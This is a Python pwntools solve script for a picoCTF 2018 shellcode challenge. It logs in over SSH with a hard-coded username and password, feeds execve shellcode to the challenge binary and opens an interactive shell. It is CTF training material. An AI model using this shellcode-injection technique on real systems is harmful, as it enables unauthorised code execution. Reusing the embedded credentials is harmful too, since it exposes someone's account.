# python2
# coding=utf-8
from pwn import *

context.binary = './vuln'

s=ssh(host='2018shell3.picoctf.com', user='Zeze', password='casper1014')
path='/problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4/vuln'
# params = {"argv":path , "cwd": os.path.dirname(path)}
s.set_working_directory('/problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4')
r=s.process('./vuln', shell=True)
# r=s.process(**params)
payload = asm(shellcraft.sh())
#payload = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendlineafter('Enter a string!', payload)
r.interactive()
